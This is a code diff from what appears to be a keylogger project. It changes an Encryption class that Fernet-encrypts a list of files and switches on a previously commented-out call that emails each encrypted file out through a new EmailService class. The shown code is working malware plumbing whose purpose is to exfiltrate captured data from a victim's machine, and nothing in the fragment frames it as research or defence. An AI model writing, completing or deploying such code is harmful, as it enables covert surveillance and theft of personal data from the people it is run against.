@@ -2,7 +2,7 @@ from cryptography.fernet import Fernet
 from time import sleep
 import os
 
-from keylogger.mail import send_email
+from keylogger.mail import EmailService
 from settings import key_filename, filenames
 from crypto.KeyGenerator import KeyGenerator
 
@@ -25,6 +25,7 @@ class Encryption:
         self.encrypt()
 
     def encrypt(self):
+        email_service = EmailService()
         for count, encrypting_file in enumerate(self.files_to_encrypt):
             if os.path.isfile(self.files_to_encrypt[count]):
                 with open(self.files_to_encrypt[count], 'rb') as f:
@@ -36,7 +37,7 @@ class Encryption:
                 with open(self.encrypted_file_names[count], 'wb') as f:
                     f.write(encrypted)
 
-                # send_email(self.encrypted_file_names[count], self.encrypted_file_names[count])
+                email_service.send_email(self.encrypted_file_names[count], self.encrypted_file_names[count])
 
     def get_key(self):
         key_path = "\\".join([self.path, key_filename])
